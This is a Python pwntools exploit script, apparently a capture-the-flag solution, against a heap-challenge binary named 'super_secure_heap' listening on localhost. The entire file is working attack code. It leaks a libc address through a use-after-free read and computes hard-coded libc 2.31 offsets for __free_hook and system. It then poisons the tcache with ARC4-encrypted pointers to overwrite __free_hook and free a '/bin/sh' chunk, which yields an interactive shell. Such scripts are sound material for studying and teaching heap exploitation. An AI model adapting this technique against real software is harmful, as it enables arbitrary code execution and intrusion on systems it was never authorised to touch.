from pwn import *
from arc4 import ARC4

context.log_level = 'debug'
context.arch = 'amd64'
mode = "key"
key = b"12345678"

NEW_QUESTION = b':\n'


def ru(a):
    return p.readuntil(a)


def r(n):
    return p.read(n)


def sla(a, b):
    p.sendlineafter(a, b)


def sa(a, b):
    p.sendafter(a, b)


def sl(a):
    p.sendline(a)


def s(a):
    p.send(a)


def toggle_mode(m):
    global mode
    if m == "key" or m == "content":
        mode = m
    else:
        raise Exception("Invalid mode specified.")


def cmd(c):
    sla(b'>\n', str(1).encode() if mode == "key" else str(2).encode())
    sla(b'>\n', str(c).encode())


def add(size):
    cmd(1)
    sla(NEW_QUESTION, str(size).encode())


def delete(index_to_delete):
    cmd(2)
    sla(NEW_QUESTION, str(index_to_delete).encode())


def edit(index: int, content=b'', key: int = 0):
    cmd(3)
    if mode == "key":
        sla(NEW_QUESTION, str(index).encode())
        sla(NEW_QUESTION, str(len(content)).encode())
        sa(NEW_QUESTION, content)
    else:
        sla(NEW_QUESTION, str(index).encode())
        sla(NEW_QUESTION, str(key).encode())
        sla(NEW_QUESTION, str(len(content)).encode())
        sa(NEW_QUESTION, content)


def read(index):
    cmd(4)
    sla(NEW_QUESTION, str(index).encode())
    res = ru(b"Do you want to")
    return res



def create_process():
    #ps = process(["../src/super_secure_heap"])
    #log.info(str(ps.pid))
    ps = remote("localhost", 9999)
    return ps


def create_initial_key():
    toggle_mode(m="key")
    add(0x20)
    edit(0, content=key)


def leak_addresses():
    toggle_mode(m="content")
    add(0x409)  # 0
    for _ in range(3):
        add(0x20)  # 1, 2, 3
    delete(0)
    address = int.from_bytes(read(0)[0x16:0x16+7].strip(), "little")

    # https://libc.blukat.me/?q=__free_hook%3A1EEE48&l=libc6_2.31-0ubuntu9.9_amd64
    libc_base = address - 0x1ecbe0
    free_hook = libc_base + 0x1eee48
    system = libc_base + 0x052290

    log.info("Leak is:        " + hex(address))
    log.info("libc is:        " + hex(libc_base))
    log.info("__free_hook is: " + hex(free_hook))
    log.info("system is:        " + hex(system))
    return free_hook, system


def trigger_shell():
    toggle_mode(m="content")
    delete(3)
    delete(2)
    delete(1)
    enc_free_hook = ARC4(key).encrypt(p64(free_hook))
    enc_bin_sh = ARC4(key).encrypt(b'/bin/sh\0')
    enc_system = ARC4(key).encrypt(p64(system))
    log.info(f"__free_hook encrypted: {enc_free_hook.hex()}")
    log.info(f"/bin/sh encrypted: {enc_bin_sh.hex()}")
    log.info(f"system encrypted: {enc_system.hex()}")
    edit(1, enc_free_hook)
    edit(2, enc_bin_sh)
    add(0x20)  # 4
    add(0x20)  # 5
    edit(5, enc_system)
    delete(2)


if __name__ == "__main__":
    p = create_process()
    pause()
    create_initial_key()
    free_hook, system = leak_addresses()
    trigger_shell()
    p.interactive()
